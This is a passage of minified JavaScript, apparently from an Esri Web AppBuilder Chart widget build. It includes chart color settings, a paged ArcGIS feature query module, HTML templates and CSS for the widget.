axisTick:{show:!1,lineStyle:{color:"#333"}},axisLabel:{show:!0,textStyle:{color:"#939393"}},splitLine:{show:!0,lineStyle:{type:"dashed",color:["rgba(255,255,255,0.1)"]}},splitArea:{show:!1,areaStyle:{color:["rgba(250,250,250,0.3)","rgba(200,200,200,0.3)"]}}},toolbox:{iconStyle:{normal:{borderColor:"#999999"},emphasis:{borderColor:"#666666"}}},legend:{textStyle:{color:"#999999"}},tooltip:{axisPointer:{lineStyle:{color:"#cccccc",width:1},crossStyle:{color:"#cccccc",width:1}}},dataZoom:{backgroundColor:"#525252",
dataBackgroundColor:"rgba(47,69,84,0.3)",fillerColor:"#737373",handleColor:"#BDBDBD",handleSize:"100%",borderColor:"#525252",textStyle:{color:"#939393"}}}):"undefined"!==typeof console&&console&&console.error&&console.error("ECharts is not Loaded")})},"jimu/dijit/_StatisticsChartSettings":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/_base/Color dojo/on dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_StatisticsChartSettings.html dijit/ColorPalette jimu/utils".split(" "),
function(q,g,n,b,a,d,h,k,m,c,e,l,y,v){return q([m,c,e,k],{baseClass:"jimu-dijit-statistics-chart-settings",templateString:l,colors:{c1:"#5d9cd3 #eb7b3a #a5a5a5 #febf29 #4673c2 #72ad4c".split(" "),c2:"#5d9cd3 #a5a5a5 #4673c2 #285f8f #636363 #274577".split(" "),c3:"#eb7b3a #febf29 #72ad4c #9c4618 #987214 44682e".split(" "),c4:"#72ad4c #4673c2 #febf29 #44682e #274577 #987214".split(" "),g1:["#43729b","#c4d5ea"],g2:["#ac5928","#f5ccbf"],g3:["#787878","#d8d8d8"],g4:["#bb8b1b","#fee1be"],g5:["#30538d",
"#c0c9e3"],g6:["#517e36","#c9dbc2"],g7:["#c4d5ea","#43729b"],g8:["#f5ccbf","#ac5928"],g9:["#d8d8d8","#787878"],g10:["#fee1be","#bb8b1b"],g11:["#c0c9e3","#30538d"],g12:["#c9dbc2","#517e36"]},palette:null,defaultSingleColor:"#5d9cd3",multiColorValue:"c1",imagesUrl:window.require.toUrl("jimu/css/images/chart/"),isInWidget:!1,type:"",singleColor:!1,config:null,postMixInProperties:function(){this.nls=window.jimuNls.statisticsChart},postCreate:function(){this.inherited(arguments);this._initSelf();this.isInWidget&&
this._bindEvents();this.own(h(this.multiColorSection,"click",g.hitch(this,function(a){a=a.target||a.srcElement;if(b.hasClass(a,"multi-color")&&!b.hasClass(a,"selected")){var c=this.multiColorValue;this._selectMultiColorDiv(a);c!==a.colorValue&&this.isInWidget&&this._configChange()}})))},_initSelf:function(){this.config=g.clone(this.config);v.combineRadioCheckBoxWithLabel(this.cbxAxisX,this.labelAxisX);v.combineRadioCheckBoxWithLabel(this.cbxAxisY,this.labelAxisY);v.combineRadioCheckBoxWithLabel(this.cbxPieLabel,
this.labelPie);this._setSingleColorForColorDiv(this.defaultSingleColor);this.palette=new y({palette:"7x10",cellClass:"cursor:pointer",style:{width:"220px"},onChange:g.hitch(this,function(a){var b=this._getSingleColorFromColorDiv();this._setSingleColorForColorDiv(a);this.isInWidget&&b!==a&&this._configChange()})});this.palette.placeAt(this.paletteContainer);this.palette.startup();n.forEach(["c1","c2","c3","c4"],g.hitch(this,function(a){b.create("div",{"class":"multi-color colorful "+a},this.colorfulContainer).colorValue=
a}));n.forEach("g1 g2 g3 g4 g5 g6 g7 g8 g9 g10 g11 g12".split(" "),g.hitch(this,function(a){b.create("div",{"class":"multi-color monochromatic "+a},this.monochromaticContainer).colorValue=a}));this._setMultiColorValue("c1");"pie"===this.type?(this.singleColor=!1,b.setStyle(this.divAxisX,"display","none"),b.setStyle(this.divAxisY,"display","none")):b.setStyle(this.divPieLabel,"display","none");this.reset();this.config&&this.setConfig(this.config)},_bindEvents:function(){"pie"===this.type?this.own(h(this.cbxPieLabel,
"change",g.hitch(this,this._configChange))):(this.own(h(this.cbxAxisX,"change",g.hitch(this,this._configChange))),this.own(h(this.cbxAxisY,"change",g.hitch(this,this._configChange))))},setConfig:function(a){this.reset();this.cbxAxisX.checked=!1===a.showHorizontalAxis?!1:!0;this.cbxAxisY.checked=!1===a.showVerticalAxis?!1:!0;this.cbxPieLabel.checked=!1===a.showDataLabel?!1:!0;a=g.clone(a.colors||[]);(this.singleColor=1===a.length&&"pie"!==this.type)?this.showSingleColor(a[0]):this.showMultiColor(a)},
getConfig:function(){var a={colors:[]};"pie"===this.type?(a.colors=this.colors[this._getMultiColorValue()],2===a.colors.length&&(a.colors=this._createHexColors(a.colors[0],a.colors[1],6)),a.showDataLabel=this.cbxPieLabel.checked):(a.showHorizontalAxis=this.cbxAxisX.checked,a.showVerticalAxis=this.cbxAxisY.checked,a.colors=this.singleColor?[this._getSingleColorFromColorDiv()]:this.colors[this._getMultiColorValue()]);return a},_setSingleColorForColorDiv:function(a){b.setStyle(this.colorDiv,"backgroundColor",
a);this.colorDiv.bgHex=a},_getSingleColorFromColorDiv:function(){return this.colorDiv.bgHex},_setMultiColorValue:function(b){(b=a("."+b,this.multiColorSection))&&0<b.length&&this._selectMultiColorDiv(b[0])},_selectMultiColorDiv:function(c){a(".multi-color",this.multiColorSection).removeClass("selected");b.addClass(c,"selected");this.multiColorValue=c.colorValue},_getMultiColorValue:function(){return this.multiColorValue},reset:function(){"pie"===this.type?this.cbxPieLabel.checked=!0:(this.cbxAxisX.checked=
!0,this.cbxAxisY.checked=!0);this.singleColor?this.showSingleColor():this.showMultiColor()},showSingleColor:function(a){"pie"===this.type?this.singleColor=!1:(this.singleColor=!0,b.setStyle(this.singleColorSection,"display","block"),b.setStyle(this.multiColorSection,"display","none"),a&&this._setSingleColorForColorDiv(a))},showMultiColor:function(a){this.singleColor=!1;b.setStyle(this.singleColorSection,"display","none");b.setStyle(this.multiColorSection,"display","block");if(a&&0<a.length){var c=
null,e=!1,h;for(h in this.colors)if(c=this.colors[h],e=!1,c.length===a.length&&(e=n.every(c,g.hitch(this,function(b,c){b=new d(b);c=new d(a[c]);return b.toHex().toLowerCase()===c.toHex().toLowerCase()})))){this._setMultiColorValue(h);break}}},showShelter:function(){b.setStyle(this.shelter,"display","block")},hideShelter:function(){b.setStyle(this.shelter,"display","none")},_configChange:function(){var a=this.getConfig();this.emit("change",a)},_createHexColors:function(a,b,c){var e=[];a=d.fromHex(a);
var g=d.fromHex(b);b=(g.r-a.r)/(c-1);for(var h=(g.g-a.g)/(c-1),g=(g.b-a.b)/(c-1),l=null,k=0;k<c;k++)l=new d,l.r=Math.floor(a.r+b*k),l.g=Math.floor(a.g+h*k),l.b=Math.floor(a.b+g*k),e.push(l.toHex());return e}})})},"widgets/Chart/Query":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred esri/tasks/query esri/tasks/QueryTask jimu/utils jimu/dijit/Message".split(" "),function(q,g,n,b,a,d,h,k){function m(){return{url:"",layerInfo:null,limit:1E4,spatialReference:null,queryType:-1,
objectIdField:"",query:{maxRecordCount:1E3,where:"",geometry:null,relationship:a.SPATIAL_REL_INTERSECTS,outFields:["*"],nextIndex:0,allCount:0,objectIds:[],features:[]}}}q=q(null,{currentAttrs:null,constructor:function(a){this.currentAttrs=m();this.currentAttrs.url=a.url;this.currentAttrs.layerInfo=a.layerInfo;this.currentAttrs.spatialReference=a.spatialReference;this.currentAttrs.query.where=a.where;this.currentAttrs.query.geometry=a.geometry;this.currentAttrs.query.maxRecordCount=a.layerInfo.maxRecordCount||
1E3;this.currentAttrs.queryType=this._getQueryType(a.layerInfo);this.currentAttrs.objectIdField=h.getObjectIdField(a.layerInfo);a.relationship&&(this.currentAttrs.query.relationship=a.relationship);a.outFields&&(this.currentAttrs.query.outFields=a.outFields);if(0<a.limit||a.limit>this.currentAttrs.query.maxRecordCount)this.currentAttrs.limit=a.limit},getFeatures:function(){var a=new b,a=this.currentAttrs.query.where,d=this.currentAttrs.query.geometry,g=this.currentAttrs.query.relationship;return a=
2===this.currentAttrs.queryType?this._getAllFeatures_SupportObjectIds(a,d,g):this._getAllFeatures_NotSupportObjectIds(a,d,g)},_getQueryType:function(a){var b=-1;return b=this._isSupportObjectIds(a)?2:3},_isSupportObjectIds:function(a){var b=0;a.currentVersion&&(b=parseFloat(a.currentVersion));return 10<=b||a.hasOwnProperty("typeIdField")},_getAllFeatures_SupportObjectIds:function(a,b,d){return this._queryIds(a,b,d).then(g.hitch(this,function(a){if(!(a&&0<a.length))return this.currentAttrs.query.allCount=
0,{status:1,count:0,features:[]};var b=a.length;this.currentAttrs.query.allCount=b;this.currentAttrs.query.objectIds=a;this.currentAttrs.query.nextIndex=0;return b>this.currentAttrs.query.maxRecordCount?this._isContinue().then(g.hitch(this,function(a){return a?this._onResultsScroll_SupportObjectIds():{status:-1,count:b,features:[]}})):this._onResultsScroll_SupportObjectIds()}))},_isContinue:function(){var a=new b,d=window.jimuNls.queryFeatures,h=new k({message:d.tooManyFeaturesTip+" "+d.askForContinue,
buttons:[{label:window.jimuNls.common.continue1,onClick:g.hitch(this,function(){a.resolve(!0);h.close()})},{label:window.jimuNls.common.cancel,onClick:g.hitch(this,function(){a.resolve(!1);h.close()})}]});return a},_onResultsScroll_SupportObjectIds:function(){var a=new b,d=this.currentAttrs.query.objectIds,h=this.currentAttrs.query.allCount,k=this.currentAttrs.query.nextIndex,m=this.currentAttrs.query.maxRecordCount,n=this.currentAttrs.query.relationship;if(k>=h)return a.resolve({status:1,count:h,
features:this.currentAttrs.query.features}),a;d=d.slice(k,k+Math.min(d.length-k,m));return 0===d.length?(a.resolve({status:1,count:h,features:this.currentAttrs.query.features}),a):this._queryByObjectIds(d,!0,n).then(g.hitch(this,function(a){a=a.features;this.currentAttrs.query.nextIndex+=a.length;this.currentAttrs.query.features=this.currentAttrs.query.features.concat(a);return this._onResultsScroll_SupportObjectIds()}))},_getAllFeatures_NotSupportObjectIds:function(a,b,d){return this._doQuery_NotSupportObjectIds(a,
b,d).then(g.hitch(this,function(a){return{status:1,count:a.length,features:a}}))},_doQuery_NotSupportObjectIds:function(a,d,h){var c=new b;this._query(a,d,!0,h).then(g.hitch(this,function(a){a=a.features;this.currentAttrs.query.allCount=a.length;c.resolve(a)}),g.hitch(this,function(a){console.error(a);c.reject(a)}));return c},_getOutputFields:function(){return["*"]},_query:function(b,e,g,h){var c=new a;c.where=b;e&&(c.geometry=e);c.outSpatialReference=this.currentAttrs.spatialReference;c.returnGeometry=
!!g;c.spatialRelationship=h;c.outFields=this._getOutputFields();return(new d(this.currentAttrs.url)).execute(c)},_queryIds:function(b,e,g){var c=new a;c.where=b;e&&(c.geometry=e);c.returnGeometry=!1;c.spatialRelationship=g;c.outSpatialReference=this.currentAttrs.spatialReference;return(new d(this.currentAttrs.url)).executeForIds(c)},_queryByObjectIds:function(c,e,h){var k=new b,l=new a;l.returnGeometry=!!e;l.outSpatialReference=this.currentAttrs.spatialReference;l.outFields=this._getOutputFields();
l.objectIds=c;l.spatialRelationship=h;(new d(this.currentAttrs.url)).execute(l).then(g.hitch(this,function(a){k.resolve(a)}),g.hitch(this,function(a){if(400===a.code){var b=this.currentAttrs.objectIdField,d="",l=c.length;n.forEach(c,g.hitch(this,function(a,c){d+=b+" \x3d "+a;c!==l-1&&(d+=" OR ")}));this._query(d,null,e,h).then(g.hitch(this,function(a){k.resolve(a)}),g.hitch(this,function(a){k.reject(a)}))}else k.reject(a)}));return k}});q.getCleanCurrentAttrsTemplate=m;return q})},"widgets/Chart/_build-generate_module":function(){define(["dojo/text!./Widget.html",
"dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:jimu/dijit/templates/StatisticsChart.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"results-header" data-dojo-attach-point\x3d"resultsHeader" style\x3d"margin-bottom:15px;"\x3e\r\n\t\t\x3cdiv class\x3d"chart-title jimu-float-leading" data-dojo-attach-point\x3d"chartTitle"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"paging-section jimu-float-leading"\x3e\r\n\t\t\t\x3cul data-dojo-attach-point\x3d"pagingUl" data-dojo-attach-event\x3d"onclick:_onPagingUlClicked"\x3e\x3c/ul\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"zoomin jimu-float-trailing" data-dojo-attach-point\x3d"zoominIcon"\x3e\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"settings jimu-float-trailing" data-dojo-attach-point\x3d"settingsIcon"\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"chartSection" class\x3d"chart-section"\x3e\r\n\t\t\x3ctable cellpadding\x3d"0" cellspacing\x3d"0" style\x3d"width:100%;table-layout:fixed;"\x3e\r\n\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"arrow-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item left-arrow arrow" data-dojo-attach-point\x3d"leftArrow" data-dojo-attach-event\x3d"onclick:_onLeftArrowClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"content-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item chart-container" data-dojo-attach-point\x3d"chartContainer" dir\x3d"ltr"\r\n\t\t\t\t\t\tstyle\x3d"direction:ltr;overflow:hidden;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"fiald-render-info" data-dojo-attach-point\x3d"faildRenderInfo"\x3e\r\n\t\t\t\t\t\t\tFailed to display chart. Too many categories.\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\x3ctd class\x3d"arrow-td"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"chart-section-item right-arrow arrow" data-dojo-attach-point\x3d"rightArrow" data-dojo-attach-event\x3d"onclick:_onRightArrowClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3c/tbody\x3e\r\n\t\t\x3c/table\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:jimu/dijit/templates/_StatisticsChartSettings.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"divAxisX" class\x3d"setting-item"\x3e\r\n\t\t\x3cinput data-dojo-attach-point\x3d"cbxAxisX" type\x3d"checkbox" /\x3e\r\n\t\t\x3clabel data-dojo-attach-point\x3d"labelAxisX"\x3e${nls.horizontalAxis}\x3c/label\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"divAxisY" class\x3d"setting-item"\x3e\r\n\t\t\x3cinput data-dojo-attach-point\x3d"cbxAxisY" type\x3d"checkbox" /\x3e\r\n\t\t\x3clabel data-dojo-attach-point\x3d"labelAxisY"\x3e${nls.verticalAxis}\x3c/label\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"divPieLabel" class\x3d"setting-item"\x3e\r\n\t\t\x3cinput data-dojo-attach-point\x3d"cbxPieLabel" type\x3d"checkbox" checked /\x3e\r\n\t\t\x3clabel data-dojo-attach-point\x3d"labelPie"\x3e${nls.dataLabels}\x3c/label\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv\x3e\r\n\t\t\x3cdiv class\x3d"color-tip"\x3e${nls.color}\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"singleColorSection" class\x3d"single-color-section"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"colorDiv" class\x3d"single-color-div"\x3e\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-point\x3d"paletteContainer" class\x3d"palette-container"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"multiColorSection" class\x3d"multi-color-section"\x3e\r\n\t\t\t\x3cdiv class\x3d"colorful-section"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"colorfulContainer"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"monochromatic-section"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"monochromaticContainer"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"shelter" data-dojo-attach-point\x3d"shelter"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Chart/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"chart-widget-content"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"chartList" class\x3d"chart-step chart-list"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"chartsNode" class\x3d"charts"\x3e\r\n        \x3cdiv class\x3d"execute-tip"\x3e\r\n          ${nls.executeChartTip}\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"charts-table-container"\x3e\r\n          \x3ctable data-dojo-attach-event\x3d"onclick:_onChartListClicked" cellpadding\x3d"0" cellspacing\x3d"0" class\x3d"charts-table" onselectstart\x3d"return false;"\x3e\r\n            \x3ccolgroup\x3e\r\n              \x3ccol width\x3d"14px"\x3e\x3c/col\x3e\r\n              \x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n              \x3ccol width\x3d"30px"\x3e\x3c/col\x3e\r\n            \x3c/colgroup\x3e\r\n            \x3ctbody data-dojo-attach-point\x3d"chartsTbody"\x3e\r\n            \x3c/tbody\x3e\r\n          \x3c/table\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"invalidConfigNode" class\x3d"invalid-config"\x3e\r\n        \x3cdiv class\x3d"error"\x3e\r\n          ${nls.invalidConfig}\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"noChartTipSection" class\x3d"no-chart-tip"\x3e\r\n        ${nls.noneChartTip}\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"chartParams" class\x3d"chart-step chart-params"\x3e\r\n      \x3cdiv class\x3d"step-head chart-params-head"\x3e\r\n        \x3cdiv class\x3d"step-title params-title"\x3e${nls.chartParams}\x3c/div\x3e\r\n        \x3cdiv class\x3d"operations"\x3e\r\n          \x3cdiv class\x3d"params-back jimu-float-leading" data-dojo-attach-event\x3d"onclick:_onBtnParamsBackClicked"\x3e\r\n            \x3cdiv class\x3d"back-icon"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"back-tip"\x3e${nls.charts}\x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"apply jimu-float-trailing" data-dojo-attach-point\x3d"btnApply" data-dojo-attach-event\x3d"onclick:_onBtnApplyClicked"\x3e${nls.apply}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"params-container" data-dojo-attach-point\x3d"paramsContainer"\x3e\r\n        \x3cdiv class\x3d"spatial-section" style\x3d"margin-top:20px; margin-bottom:20px;"\x3e\r\n          \x3cdiv\x3e\r\n            \x3cinput type\x3d"checkbox" checked\x3d"false" data-dojo-attach-point\x3d"cbxUseSpatial" data-dojo-attach-event\x3d"onclick: _onCbxUseSpatialClicked" /\x3e\r\n            \x3clabel data-dojo-attach-point\x3d"labelUseSpatial"\x3e${nls.useSpatialFilter}\x3c/label\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"selectSpatialDiv" class\x3d"select-spatial"\x3e\r\n            \x3ctable class\x3d"current-view" valign\x3d"top" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n              \x3ctbody\x3e\r\n                \x3ctr class\x3d"current-extent-tr"\x3e\r\n                  \x3ctd\x3e\r\n                    \x3cinput type\x3d"radio" class\x3d"jimu-radio-btn" data-dojo-attach-point\x3d"cbxUseMapExtent" checked data-dojo-attach-event\x3d"onclick:_onCbxUseMapExtentClicked" /\x3e\r\n                  \x3c/td\x3e\r\n                  \x3ctd class\x3d"current-extent-td"\x3e\r\n                    \x3clabel data-dojo-attach-point\x3d"labelUseMapExtent" class\x3d"map-extent-tip"\x3e${nls.useCurrentMapExtent}\x3c/label\x3e\r\n                  \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n                \x3ctr class\x3d"draw-graphic-tr"\x3e\r\n                  \x3ctd\x3e\r\n                    \x3cinput type\x3d"radio" class\x3d"jimu-radio-btn" data-dojo-attach-point\x3d"cbxDrawGraphic" data-dojo-attach-event\x3d"onclick:_onCbxDrawGraphicClicked" /\x3e\r\n                  \x3c/td\x3e\r\n                  \x3ctd class\x3d"draw-graphic-td"\x3e\r\n                    \x3clabel data-dojo-attach-point\x3d"labelDrawGraphic" class\x3d"draw-graphic-tip"\x3e${nls.drawGraphicOnMap}\x3c/label\x3e\r\n                  \x3c/td\x3e\r\n                \x3c/tr\x3e\r\n              \x3c/tbody\x3e\r\n            \x3c/table\x3e\r\n            \x3cdiv class\x3d"draw-graphic" data-dojo-attach-point\x3d"drawBoxDiv"\x3e\x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"chartResults" class\x3d"chart-step chart-results"\x3e\r\n      \x3cdiv class\x3d"step-head chart-results-head"\x3e\r\n        \x3cdiv class\x3d"step-title results-title"\x3e${nls.chartResults}\x3c/div\x3e\r\n        \x3cdiv class\x3d"operations"\x3e\r\n          \x3cdiv class\x3d"params-back jimu-float-leading" data-dojo-attach-event\x3d"onclick:_onBtnResultsBackClicked"\x3e\r\n            \x3cdiv class\x3d"back-icon"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"back-tip" data-dojo-attach-point\x3d"btnResultsBack"\x3e${nls.chartParams}\x3c/div\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"results-container" data-dojo-attach-point\x3d"resultsContainer"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"btn-section"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"btnClearAll" data-dojo-attach-event\x3d"onclick:_onBtnClearAllClicked" class\x3d"jimu-btn jimu-priority-secondary btn-clear-all" title\x3d"${nls.clearResults}"\x3e${nls.clearResults}\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Chart/css/style.css":".jimu-widget-chart{position: relative; width: 100%; height: 100%; min-width: 222px; min-height: 237px; overflow-x: hidden;}.jimu-widget-chart .chart-widget-content{position: absolute; width: 100%; left: 0; right: 0; height: auto; top: 0; bottom: 60px;}.jimu-widget-chart .btn-section{position: absolute; width: 100%; left: 0; right: 0; bottom: 0; height: auto; text-align: center;}.jimu-widget-chart .btn-section .btn-clear-all{margin-left: auto; margin-right: auto; overflow: hidden; text-overflow: ellipsis;}.jimu-widget-chart .chart-step{position: absolute; width: 100%; height: 100%; top: 0;}.jimu-widget-chart .chart-list{left: 0;}.jimu-widget-chart .chart-list .charts{position: absolute; width: 100%; height: 100%; left: 0; top: 0; overflow-y: auto;}.jimu-widget-chart .chart-list .charts .execute-tip{line-height: 20px;}.jimu-widget-chart .chart-list .charts .charts-table-container{width: 100%; margin-top: 15px;}.jimu-widget-chart .chart-list .charts .charts-table{width: 99%; border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto;}.jimu-widget-chart .chart-list .charts .charts-table td{height: 30px; line-height: 30px; cursor: pointer;}.jimu-widget-chart .chart-list .charts .charts-table tr *{cursor: pointer;}.jimu-widget-chart .chart-list .charts .charts-table .second-td{color: #686868; font-size: 12px;}.jimu-widget-chart .chart-list .charts .charts-table .chart-name-div{width: 100%; overflow: hidden; text-overflow: ellipsis; height: 100%;}.jimu-widget-chart .chart-list .charts .charts-table .third-td .arrow{background-repeat: no-repeat; background-position: center; background-image: url(images/arrow_right1.png); width: 100%; height: 100%;}.jimu-rtl .jimu-widget-chart .chart-list .charts .charts-table .third-td .arrow{background-image: url(images/rtl_arrow_right1.png);}.jimu-widget-chart .charts-table .jimu-table-row.jimu-state-active .third-td .arrow{background-image: url(images/arrow_right2.png);}.jimu-rtl .jimu-widget-chart .charts-table .jimu-table-row.jimu-state-active .third-td .arrow{background-image: url(images/rtl_arrow_right2.png);}.jimu-widget-chart .charts-table .jimu-table-row:hover .third-td .arrow{background-image: url(images/arrow_right2.png);}.jimu-rtl .jimu-widget-chart .charts-table .jimu-table-row:hover .third-td .arrow{background-image: url(images/rtl_arrow_right2.png);}.jimu-widget-chart .chart-list .invalid-config{display: none; position: absolute; width: 100%; height: 100%; left: 0; top: 0;}.jimu-widget-chart .chart-list .no-chart-tip{display: none; line-height: 20px;}.jimu-widget-chart .step-head{position: relative; width: 100%; height: 30px; line-height: 30px;}.jimu-widget-chart .step-title{position: absolute; width: 100%; height: 100%; left: 0; top: 0; text-align: center; font-size: 14px; color: #86909c;}.jimu-widget-chart .step-head .operations{position: absolute; width: 100%; height: 100%; left: 0; right: 0; top: 0;}.jimu-widget-chart .step-head .operations .params-back{color: blue; cursor: pointer; height: 100%; white-space: nowrap;}.jimu-widget-chart .step-head .operations .params-back \x3e *{display: inline-block; vertical-align: middle;}.jimu-widget-chart .step-head .operations .params-back .back-icon{width: 8px; height: 100%; background-repeat: no-repeat; background-position: center center; background-image: url(images/arrow_left.png); margin-right: 5px;}.jimu-rtl .jimu-widget-chart .step-head .operations .params-back .back-icon{background-image: url(images/rtl_arrow_left.png); margin-right: 0; margin-left: 5px;}.jimu-widget-chart .step-head .operations .params-back .back-tip{height: 100%; color: #51b1fe;}.jimu-widget-chart .chart-params{left: 100%;}.jimu-widget-chart .chart-params-head .operations .apply{cursor: pointer; height: 100%; color: #51b1fe;}.jimu-widget-chart .params-container{position: absolute; width: 100%; left: 0; top: 40px; bottom: 0; overflow-y: auto;}.jimu-widget-chart .chart-params table.current-view{width: auto; border-collapse: collapse; margin-top: 10px;}.jimu-widget-chart .chart-params table.current-view td{vertical-align: top;}.jimu-widget-chart .chart-params .draw-graphic{margin-top: 5px;}.jimu-widget-chart .chart-params .select-spatial{margin-left: 7px; margin-top: 7px;}.jimu-rtl .jimu-widget-chart .chart-params .select-spatial{margin-left: 0; margin-right: 7px;}.jimu-widget-chart .chart-params .current-extent-td{padding-left: 8px;}.jimu-rtl .jimu-widget-chart .chart-params .current-extent-td{padding-left: 0; padding-right: 8px;}.jimu-widget-chart .chart-params .draw-graphic-tr td{padding-top: 5px;}.jimu-widget-chart .chart-params .draw-graphic-td{padding-left: 8px;}.jimu-rtl .jimu-widget-chart .chart-params .draw-graphic-td{padding-left: 0; padding-right: 8px;}.jimu-widget-chart .chart-results{left: 200%;}.jimu-widget-chart .chart-results .results-container{position: absolute; width: 100%; left: 0; top: 50px; bottom: 0; overflow-x: hidden; overflow-y: auto;}",
"*now":function(q){q(['dojo/i18n!*preload*widgets/Chart/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/query dojo/_base/html dojo/_base/array dojo/_base/fx dojo/on dijit/_WidgetsInTemplateMixin jimu/BaseWidget jimu/dijit/Message jimu/dijit/DrawBox jimu/utils jimu/filterUtils esri/layers/FeatureLayer esri/renderers/SimpleRenderer esri/symbols/jsonUtils esri/request esri/graphicsUtils jimu/dijit/StatisticsChart ./Query jimu/LayerInfos/LayerInfos jimu/dijit/Popup jimu/dijit/LoadingShelter".split(" "),function(q,g,n,b,a,d,h,k,m,c,e,l,y,v,p,D,B,w,r,
u,t,A){return q([m,k],{name:"Chart",baseClass:"jimu-widget-chart",isValidConfig:!1,currentAttrs:null,tempResultLayer:null,previewArgs:null,previewPopup:null,layerInfosObj:null,_resetCurrentAttrs:function(){this.currentAttrs={chartTr:null,config:null,layerInfo:null}},postMixInProperties:function(){this.inherited(arguments);this.nls.colorful=this.nls.colorful||"Colorful";this.nls.monochromatic=this.nls.monochromatic||"Monochromatic";this.nls.clearResults=window.jimuNls.drawBox.clear;this.layerInfosObj=
t.getInstanceSync();this.config&&(this._setUrlForConfig(),this._updateConfig())},_updateConfig:function(){this.config&&this.config.charts&&0<this.config.charts.length&&a.forEach(this.config.charts,g.hitch(this,function(a){this._rebuildFilter(a.url,a.filter)}))},_setUrlForConfig:function(){this.config&&this.config.charts&&0<this.config.charts.length&&a.forEach(this.config.charts,g.hitch(this,function(a){if(a.webMapLayerId){var b=this.layerInfosObj.getLayerOrTableInfoById(a.webMapLayerId);b&&(a.url=
